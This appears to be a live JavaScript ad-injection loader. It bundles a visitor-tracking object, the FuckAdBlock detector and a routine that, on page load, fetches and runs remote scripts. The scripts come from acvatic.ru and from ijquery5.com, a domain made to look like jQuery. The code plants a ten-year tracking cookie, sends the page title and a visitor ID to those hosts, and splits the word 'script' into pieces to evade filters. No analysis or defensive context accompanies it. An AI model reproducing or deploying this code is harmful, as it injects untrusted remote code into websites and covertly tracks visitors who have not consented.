var __MYCPM = {
    "visitorId": "",
    "_callback": null,
    "_cookie_name": null,
    "_isCall": false,
    "getVisitorId": function (cookie_name, callback) {
        this._callback = callback;
        this._cookie_name = cookie_name;
        if (typeof(callback) !== "function") {
            return null;
        }
        this.visitorId = this.getCookie(cookie_name);
        if (this.visitorId) {
            callback(this.visitorId);
            return;
        }
        this.loadScript("http://acvatic.ru/cookie.js?callback=__MYCPM.onNewCookie")
        var self = this;
        setTimeout(function(){
            if (!self._isCall){
                self._isCall = true;
                self._callback(self.visitorId);
            }
        }, 500);
    },
    "getCookie": function (name) {
        var value = "; " + document.cookie;
        var parts = value.split("; " + name + "=");

        if (parts.length >= 2) return parts.pop().split(";").shift();
        return null;
    },
    "loadScript": function (script_url) {
        var script = document.createElement("sc" + "r" + "ipt");
        script.setAttribute("type", "text/java" + "sc" + "r" + "ipt");
        var heads = document.getElementsByTagName("head");
        if (heads.length){
            heads[0].appendChild(script);
            script.setAttribute("src", script_url);
        }
    },
    "onNewCookie": function (value) {
        this.visitorId = value;
        var date = new Date(new Date().getTime() + 10 * 365 * 24 * 60 * 60 * 1000);
        document.cookie = this._cookie_name + "=" + value + "; path=/; expires=" + date.toUTCString();
        if (!this._isCall){
            this._isCall = true;
            this._callback(value);
        }
    }
};(function(window) {
    var FuckAdBlock = function(options) {
        this._options = {
            checkOnLoad:		false,
            resetOnEnd:			false,
            loopCheckTime:		50,
            loopMaxNumber:		5,
            baitClass:			'pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links',
            baitStyle:			'width: 1px !important; height: 1px !important; position: absolute !important; left: -10000px !important; top: -1000px !important;',
            debug:				false
        };
        this._var = {
            version:			'3.2.0',
            bait:				null,
            checking:			false,
            loop:				null,
            loopNumber:			0,
            event:				{ detected: [], notDetected: [] }
        };
        if(options !== undefined) {
            this.setOption(options);
        }
        var self = this;
        var eventCallback = function() {
            setTimeout(function() {
                if(self._options.checkOnLoad === true) {
                    if(self._options.debug === true) {
                        self._log('onload->eventCallback', 'A check loading is launched');
                    }
                    if(self._var.bait === null) {
                        self._creatBait();
                    }
                    setTimeout(function() {
                        self.check();
                    }, 1);
                }
            }, 1);
        };
        if(window.addEventListener !== undefined) {
            window.addEventListener('load', eventCallback, false);
        } else {
            window.attachEvent('onload', eventCallback);
        }
    };
    FuckAdBlock.prototype._options = null;
    FuckAdBlock.prototype._var = null;
    FuckAdBlock.prototype._bait = null;

    FuckAdBlock.prototype._log = function(method, message) {
        console.log('[FuckAdBlock]['+method+'] '+message);
    };

    FuckAdBlock.prototype.setOption = function(options, value) {
        if(value !== undefined) {
            var key = options;
            options = {};
            options[key] = value;
        }
        for(var option in options) {
            this._options[option] = options[option];
            if(this._options.debug === true) {
                this._log('setOption', 'The option "'+option+'" he was assigned to "'+options[option]+'"');
            }
        }
        return this;
    };

    FuckAdBlock.prototype._creatBait = function() {
        var bait = document.createElement('div');
        bait.setAttribute('class', this._options.baitClass);
        bait.setAttribute('style', this._options.baitStyle);
        this._var.bait = window.document.body.appendChild(bait);

        this._var.bait.offsetParent;
        this._var.bait.offsetHeight;
        this._var.bait.offsetLeft;
        this._var.bait.offsetTop;
        this._var.bait.offsetWidth;
        this._var.bait.clientHeight;
        this._var.bait.clientWidth;

        if(this._options.debug === true) {
            this._log('_creatBait', 'Bait has been created');
        }
    };
    FuckAdBlock.prototype._destroyBait = function() {
        window.document.body.removeChild(this._var.bait);
        this._var.bait = null;

        if(this._options.debug === true) {
            this._log('_destroyBait', 'Bait has been removed');
        }
    };

    FuckAdBlock.prototype.check = function(loop) {
        if(loop === undefined) {
            loop = true;
        }

        if(this._options.debug === true) {
            this._log('check', 'An audit was requested '+(loop===true?'with a':'without')+' loop');
        }

        if(this._var.checking === true) {
            if(this._options.debug === true) {
                this._log('check', 'A check was canceled because there is already an ongoing');
            }
            return false;
        }
        this._var.checking = true;

        if(this._var.bait === null) {
            this._creatBait();
        }

        var self = this;
        this._var.loopNumber = 0;
        if(loop === true) {
            this._var.loop = setInterval(function() {
                self._checkBait(loop);
            }, this._options.loopCheckTime);
        }
        setTimeout(function() {
            self._checkBait(loop);
        }, 1);
        if(this._options.debug === true) {
            this._log('check', 'A check is in progress ...');
        }

        return true;
    };
    FuckAdBlock.prototype._checkBait = function(loop) {
        var detected = false;

        if(this._var.bait === null) {
            this._creatBait();
        }

        if(window.document.body.getAttribute('abp') !== null
            || this._var.bait.offsetParent === null
            || this._var.bait.offsetHeight == 0
            || this._var.bait.offsetLeft == 0
            || this._var.bait.offsetTop == 0
            || this._var.bait.offsetWidth == 0
            || this._var.bait.clientHeight == 0
            || this._var.bait.clientWidth == 0) {
            detected = true;
        }
        if(window.getComputedStyle !== undefined) {
            var baitTemp = window.getComputedStyle(this._var.bait, null);
            if(baitTemp.getPropertyValue('display') == 'none'
                || baitTemp.getPropertyValue('visibility') == 'hidden') {
                detected = true;
            }
        }

        if(this._options.debug === true) {
            this._log('_checkBait', 'A check ('+(this._var.loopNumber+1)+'/'+this._options.loopMaxNumber+' ~'+(1+this._var.loopNumber*this._options.loopCheckTime)+'ms) was conducted and detection is '+(detected===true?'positive':'negative'));
        }

        if(loop === true) {
            this._var.loopNumber++;
            if(this._var.loopNumber >= this._options.loopMaxNumber) {
                this._stopLoop();
            }
        }

        if(detected === true) {
            this._stopLoop();
            this._destroyBait();
            this.emitEvent(true);
            if(loop === true) {
                this._var.checking = false;
            }
        } else if(this._var.loop === null || loop === false) {
            this._destroyBait();
            this.emitEvent(false);
            if(loop === true) {
                this._var.checking = false;
            }
        }
    };
    FuckAdBlock.prototype._stopLoop = function(detected) {
        clearInterval(this._var.loop);
        this._var.loop = null;
        this._var.loopNumber = 0;

        if(this._options.debug === true) {
            this._log('_stopLoop', 'A loop has been stopped');
        }
    };

    FuckAdBlock.prototype.emitEvent = function(detected) {
        if(this._options.debug === true) {
            this._log('emitEvent', 'An event with a '+(detected===true?'positive':'negative')+' detection was called');
        }

        var fns = this._var.event[(detected===true?'detected':'notDetected')];
        for(var i in fns) {
            if(this._options.debug === true) {
                this._log('emitEvent', 'Call function '+(parseInt(i)+1)+'/'+fns.length);
            }
            if(fns.hasOwnProperty(i)) {
                fns[i]();
            }
        }
        if(this._options.resetOnEnd === true) {
            this.clearEvent();
        }
        return this;
    };
    FuckAdBlock.prototype.clearEvent = function() {
        this._var.event.detected = [];
        this._var.event.notDetected = [];

        if(this._options.debug === true) {
            this._log('clearEvent', 'The event list has been cleared');
        }
    };

    FuckAdBlock.prototype.on = function(detected, fn) {
        this._var.event[(detected===true?'detected':'notDetected')].push(fn);
        if(this._options.debug === true) {
            this._log('on', 'A type of event "'+(detected===true?'detected':'notDetected')+'" was added');
        }

        return this;
    };
    FuckAdBlock.prototype.onDetected = function(fn) {
        return this.on(true, fn);
    };
    FuckAdBlock.prototype.onNotDetected = function(fn) {
        return this.on(false, fn);
    };

    window.FuckAdBlock = FuckAdBlock;

    if(window.fuckAdBlock === undefined && !window.__mycpm_data) {
        window.fuckAdBlock = new FuckAdBlock({
            checkOnLoad: false,
            resetOnEnd: true
        });
    }
})(window);(function(window) {
    var domains = ["ijquery5.com"];
    var stream_domains = false;
    var counter = 0;
    var stream_id = 'undefined' == typeof window.stream_id ? '183' : window.stream_id;

    function addScript(src) {
        var elem = document.createElement("script");
        elem.src = src;
        document.head.appendChild(elem);
    }

    function onAdblockDetected() {
        window.checkInterval = window.setInterval(function() {
            var domain = domains[counter];
            var url = 'http://' + domain + '/domains/check?domain=' + domain + '&callback=allowDomain';
            addScript(url);

            counter++;

            if (counter == domains.length) {
                window.clearInterval(window.checkInterval);
            }
        }, 200);
    }

    window.allowDomain = function(domain) {
        if ('undefined' == typeof domain) {
            domain = domains[0];
        }
        window.clearInterval(window.checkInterval);

        __MYCPM.getVisitorId("_mycpm_vid", function(vid){
            addScript("http://" + domain + "/core/?action=cs&vid=" + vid +
                "&stream_id=" + stream_id + "&title=" + encodeURIComponent(document.title));
        });
    };

    if (stream_domains) {
        if (stream_domains.hasOwnProperty(stream_id)) {
            var stream_domain = stream_domains[stream_id];
            domains.unshift(stream_domain);
        }
    }

    if(window.document.body){
        
        if (typeof fuckAdBlock === 'undefined') {
            onAdblockDetected();
        }
        
        fuckAdBlock.onDetected(onAdblockDetected);
        fuckAdBlock.onNotDetected(allowDomain);
    
        fuckAdBlock.check(true);
    }
    
})(window);